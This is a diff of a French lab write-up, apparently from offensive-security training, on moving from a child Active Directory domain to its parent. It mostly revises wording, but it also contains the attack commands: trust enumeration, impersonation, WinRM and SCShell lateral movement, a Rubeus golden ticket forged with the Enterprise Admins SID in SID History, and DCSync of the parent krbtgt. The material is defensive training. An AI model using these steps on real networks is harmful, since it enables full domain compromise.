@@ -1,4 +1,4 @@
-# Lab — Parent-Child Trusts  
+# Lab — Relations de confiance parent-enfant  
 
 >L’objectif de ce lab est de passer d’un **domaine enfant** à son **domaine parent**.
 
@@ -11,10 +11,10 @@
 ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
 ```
 
-⚠️ Résultats
+**Résultats attendus :**
  
-    > - trustDirection 3 is TRUST_DIRECTION_BIDIRECTIONAL
-    > - trustAttributes 32 is TRUST_ATTRIBUTE_WITHIN_FOREST
+    > - `trustDirection=3` : relation bidirectionnelle (`TRUST_DIRECTION_BIDIRECTIONAL`)
+    > - `trustAttributes=32` : relation interne à la forêt (`TRUST_ATTRIBUTE_WITHIN_FOREST`)
 
 3. Récupérer le **SID** du domaine enfant.
 
@@ -22,7 +22,7 @@ ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,
 ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
 ```
 
-⚠️ La commande doit renvoyer *S-1-5-21-690277740-3036021016-2883941857*.
+**Résultat attendu :** *S-1-5-21-690277740-3036021016-2883941857*.
 
 4. Récupérer le **SID** du groupe **Enterprise Admins** du domaine parent.
 
@@ -30,11 +30,11 @@ ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC
 ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
 ```
 	
-⚠️ La commande doit renvoyer *S-1-5-21-3926355307-1661546229-813047887-519*.
+**Résultat attendu :** *S-1-5-21-3926355307-1661546229-813047887-519*.
 
 ===
 
-## Credential Access
+## Récupération des identifiants (Credential Access)
 
 1. Effectuer une **impersonation** de l’utilisateur *sguest*.
 
@@ -47,9 +47,9 @@ krb_triage
 ls \\dub-dc-1\c$
 ```
 
-⚠️ Cet utilisateur est **Domain Admin** dans le domaine enfant Dublin.
+**Contexte :** dans le lab, cet utilisateur est Domain Admin du domaine enfant Dublin.
 
-## Lateral Movement vers le domaine Dublin  
+## Lateral Movement vers Dublin  
 
 ```
 jump winrm64 dub-dc-1 smb
@@ -77,7 +77,7 @@ Credentials
 <snip>
 ```
 
-## Golden Ticket
+## Générer et utiliser un Golden Ticket
 
 1. Depuis l’**Attacker Desktop**, générer un **Golden Ticket** dans un fichier `.kirbi` à l’aide du terminal PowerShell.
 
@@ -93,7 +93,7 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain
 kerberos_ticket_use C:\Users\Attacker\Desktop\golden_2026_04_29_06_43_02_Administrator_to_krbtgt@DUBLIN.CONTOSO.COM
 ```
 
-⚠️ Cette opération remplace le **TGT** actuel de `sguest`.
+**Attention :** cette opération remplace le TGT courant de `sguest`.
 
 3. Vérifier la présence du ticket dans la session.
 ```
@@ -109,13 +109,13 @@ ls \\lon-dc-1\c$
 
 ## Lateral Movement de Dublin vers Londres  
 
-> Charger le fichier CNA dans le **Script Manager** `C:\Tools\SCShell\CS-BOF\scshell.cna` for `scshell64`  
+> Charger le fichier CNA dans le **Script Manager** `C:\Tools\SCShell\CS-BOF\scshell.cna` avant d’utiliser `scshell64`  
 ```
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-dc-1 smb
 ```
   
-## Forest et Domain Dominance  
+## Domain Dominance dans la forêt  
 
 ```
 getuid
@@ -152,5 +152,5 @@ Supplemental Credentials:
 
 <img src="/images/Parent-Child-Trusts-dcsync-contoso-krbtgt.png">  
 
-⚠️ Dans ce lab, un **Golden Ticket** exploitant la **SID History** permet l’impersonation d’un Enterprise Admin et le passage d’une **Parent-Child Trust**.
+**Bilan :** le lab illustre la manière dont SID History et les tickets Kerberos interviennent dans les relations de confiance parent-enfant.
 
